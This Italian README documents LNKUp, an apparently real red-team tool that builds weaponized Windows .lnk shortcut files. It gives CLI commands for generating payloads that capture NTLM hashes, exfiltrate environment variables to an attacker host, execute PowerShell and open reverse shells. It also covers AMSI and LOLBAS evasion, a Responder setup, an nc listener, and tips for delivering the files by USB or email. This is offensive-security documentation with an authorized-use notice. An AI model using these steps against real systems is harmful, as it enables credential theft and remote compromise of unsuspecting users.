# LNKUp - Advanced LNK Payload Generator

Modern red teaming tool per la generazione di file Windows shortcut (`.lnk`) weaponizzati per penetration testing e sicurezza offensiva.

## ✨ Features

- 🔐 **NTLM Hash Capture** - Cattura credenziali senza interazione utente
- 📊 **Environment Variable Exfiltration** - Reconnaissance via variabili di sistema
- ⚡ **PowerShell Command Execution** - Esecuzione di payload arbitrari
- 🌐 **Multi-Protocol Exfiltration** - UNC, WebDAV, HTTP/HTTPS
- 🛡️ **Advanced Evasion** - AMSI bypass, LOLBAS proxy, obfuscation
- 🧙 **Interactive Wizard** - Interfaccia guidata user-friendly
- 📝 **YAML Configuration** - Payload complessi e ripetibili
- 🖥️ **Cross-Platform** - Windows, Linux, macOS

## 🚀 Quick Start

### 1. Installazione

```bash
# Clone repository
git clone <repo-url>
cd LNKUp

# Setup virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install dependencies
pip install pydantic pyyaml pylnk3
# On Windows: pip install pywin32
```

### 2. Uso con Wizard Interattivo (Raccomandato)

```bash
python wizard.py
```

Il wizard ti guiderà attraverso tutte le opzioni con spiegazioni dettagliate.

### 3. Uso Rapido da CLI

```bash
# NTLM Capture
python generate_new.py --host 192.168.1.100 --type ntlm --output output/capture.lnk

# Environment Exfiltration
python generate_new.py --host 192.168.1.100 --vars USERNAME,COMPUTERNAME --type environment --output output/recon.lnk

# Command Execution
python generate_new.py --host 192.168.1.100 --execute "whoami" --type all --output output/execute.lnk
```

## 📋 Modalità d'Uso

### 🧙 Wizard Interattivo
```bash
python wizard.py
```
Perfetto per principianti e per esplorare tutte le opzioni disponibili.

### 💻 Command Line
```bash
python generate_new.py --help
```
Per utenti esperti che preferiscono la CLI.

### 📄 File YAML
```bash
python generate_new.py --generate-config
python generate_new.py --config config.yml --output output/advanced.lnk
```
Per scenari complessi e ripetibili.

## 📚 Documentazione Completa

Consulta **[DOCUMENTATION.md](DOCUMENTATION.md)** per:
- Tutti i tipi di payload disponibili
- Configurazione dettagliata delle opzioni
- Scenari pratici ed esempi
- Evasion techniques spiegate
- Troubleshooting e FAQ
- Setup listener (Responder, Metasploit, etc.)

## 🎯 Tipi di Payload

| Tipo | Descrizione | Rilevabilità | Complessità |
|------|-------------|--------------|-------------|
| 🔐 **NTLM Capture** | Cattura hash senza click | ⭐ Bassa | ⭐ Facile |
| 📊 **Env Exfil** | Variabili d'ambiente | ⭐⭐ Media | ⭐⭐ Media |
| ⚡ **Command Exec** | Esecuzione PowerShell | ⭐⭐⭐ Alta | ⭐⭐⭐ Media |
| 🎯 **Hybrid** | Tutto in uno | ⭐⭐⭐⭐ Molto Alta | ⭐⭐⭐⭐ Avanzata |
| 🌐 **WebDAV** | Exfil via HTTP/HTTPS | ⭐⭐⭐ Media | ⭐⭐⭐⭐ Avanzata |

## 📁 Struttura del Progetto

```
LNKUp/
├── wizard.py               # Wizard interattivo (raccomandato)
├── generate_new.py         # Versione moderna con evasion
├── generate.py             # Versione originale (semplice)
├── config.yml              # Configurazione di esempio
├── DOCUMENTATION.md        # Documentazione completa
├── README.md               # Questo file
├── requirements.txt        # Dipendenze Python
├── output/                 # Payload generati
└── .venv/                  # Virtual environment
```

## 🛠️ Versioni Disponibili

### `wizard.py` - ⭐ Raccomandato per iniziare
Interfaccia interattiva guidata con spiegazioni dettagliate per ogni opzione.

### `generate_new.py` - Versione Moderna
- OOP architecture
- Advanced evasion techniques
- Multi-protocol exfiltration
- YAML configuration support
- Pydantic validation
- Structured logging

### `generate.py` - Versione Originale
Versione semplice e stabile per uso base.

## 🎓 Esempi Pratici

### NTLM Hash Capture (Passivo)
```bash
# Setup listener
sudo responder -I eth0 -v

# Generate payload
python generate_new.py --host 192.168.1.100 --type ntlm --output output/Document.lnk

# Deploy payload (USB, email, file share)
# Wait for connection → Hash captured!
```

### Environment Reconnaissance
```bash
python generate_new.py \
  --host 192.168.1.100 \
  --vars USERNAME,COMPUTERNAME,USERDOMAIN,LOGONSERVER \
  --type environment \
  --output output/Report.lnk
```

### Reverse Shell
```bash
# Start listener
nc -lvnp 4444

# Generate payload with reverse shell
python wizard.py
# Select: Command Execution → Reverse Shell PowerShell
```

## ⚠️ Legal Notice

**IMPORTANTE:** Questo tool è fornito esclusivamente per scopi educativi e di sicurezza autorizzata.

✅ **Uso Legale:**
- Penetration testing con autorizzazione scritta
- Red team assessment con contratto
- Ricerca accademica in ambiente controllato
- Bug bounty program autorizzati

❌ **Uso Illegale:**
- Accesso non autorizzato a sistemi
- Distribuzione di malware
- Violazione di privacy
- Furto di credenziali

**Gli autori non sono responsabili per usi impropri.**

## 🔗 Tool Complementari

- **Responder**: SMB/NTLM capture
- **Impacket**: NTLM relay toolkit
- **Metasploit**: Exploitation framework
- **Invoke-Obfuscation**: PowerShell obfuscation

## 🐛 Troubleshooting

Consulta la sezione Troubleshooting in [DOCUMENTATION.md](DOCUMENTATION.md) per problemi comuni e soluzioni.

## 📊 Changelog

### v2.0 (Current)
- ✅ Wizard interattivo
- ✅ YAML configuration
- ✅ Advanced evasion (AMSI, LOLBAS)
- ✅ WebDAV support
- ✅ UTF-16LE encoding fix
- ✅ Cross-platform support ripristinato

### v1.0 (Original)
- ✅ NTLM capture base
- ✅ Environment exfiltration
- ✅ Command execution

## 📬 Credits

- **Original Project**: LNKUp by [@Plazmaz](https://www.twitter.com/Plazmaz)
- **Modern Enhancements**: Advanced red teaming techniques integration
- **Contributors**: Security research community

---

**Per documentazione completa, consulta [DOCUMENTATION.md](DOCUMENTATION.md)**

**Buon red teaming! 🎯🔐**
